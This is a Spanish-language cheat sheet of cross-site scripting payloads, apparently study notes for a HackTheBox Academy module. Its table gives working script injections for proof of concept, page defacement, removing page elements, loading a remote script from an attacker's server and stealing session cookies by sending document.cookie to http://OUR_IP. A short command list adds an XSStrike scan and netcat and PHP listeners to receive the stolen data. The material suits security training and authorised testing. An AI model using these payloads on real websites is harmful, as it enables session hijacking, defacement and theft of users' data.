---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - CWES

***

## Cheatsheet

| **Código / Payload**                                                                          | **Descripción**               | **Detalles Adicionales / Uso Práctico**                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------- | ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload             | Ideal como Prueba de Concepto (PoC) rápida para confirmar la ejecución de JavaScript y verificar el origen actual (dominio) en el que se ejecuta.                                                               |
| `<plaintext>`                                                                                 | Basic XSS Payload             | Detiene el procesamiento del resto del HTML en la página. Es útil para "romper" la estructura del sitio y ver el código fuente restante en texto plano, aunque es menos común para explotación directa.         |
| `<script>print()</script>`                                                                    | Basic XSS Payload             | Una excelente alternativa de PoC si funciones como `alert()`, `prompt()` o `confirm()` están bloqueadas por un WAF (Web Application Firewall). Abre el cuadro de diálogo de impresión del navegador.            |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload        | Utiliza un manejador de eventos (`onerror`) en una etiqueta de imagen que falla a propósito (porque `src` está vacío). Es un método clásico para evadir filtros que bloquean la etiqueta `<script>`.            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color       | Sirve como confirmación visual inofensiva de que el XSS funciona, o como una técnica de defacement (desfiguración) muy leve.                                                                                    |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image       | Defacement visual. Demuestra al cliente o al equipo de desarrollo que un atacante podría alterar por completo la apariencia del sitio web insertando imágenes externas.                                         |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title          | Manipulación sutil del DOM. Demuestra control sobre los metadatos de la página visible para el usuario en la pestaña del navegador.                                                                             |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body | Defacement total. Reemplaza todo el contenido visible de la página web. Demuestra un impacto alto al poder simular que el sitio ha sido tomado por completo.                                                    |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element   | Manipulación específica del DOM. Puede usarse para ocultar advertencias de seguridad, eliminar botones críticos o interrumpir el funcionamiento normal de la aplicación.                                        |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script            | Muy peligroso. Permite cargar un payload complejo (como un keylogger o un hook de BeEF) desde un servidor externo controlado, evitando tener que inyectar código largo directamente en el parámetro vulnerable. |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us     | Exfiltración de datos. Roba las cookies de sesión de la víctima (si no tienen la flag `HttpOnly`) forzando al navegador a hacer una petición a tu servidor con las cookies adjuntas en la URL.                  |


---

### Comandos

|**Comando**|**Descripción**|
|---|---|
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run xsstrike on a url parameter|
|`sudo nc -lvnp 80`|Start netcat listener|
|`sudo php -S 0.0.0.0:80`|Start PHP server|
